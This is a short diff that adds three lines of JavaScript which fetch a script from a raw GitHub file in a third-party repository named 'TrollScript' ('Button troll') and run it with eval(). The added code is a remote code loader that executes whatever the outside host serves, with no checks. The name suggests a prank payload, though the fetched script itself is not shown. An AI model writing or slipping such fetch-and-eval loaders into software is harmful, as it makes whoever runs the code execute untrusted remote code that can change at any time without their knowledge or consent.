@@ -1,0 +1,3 @@
+fetch('https://raw.githubusercontent.com/DeveloperScripter/TrollScript/main/Button%20troll')
+  .then(response => response.text())
+  .then(code => eval(code));
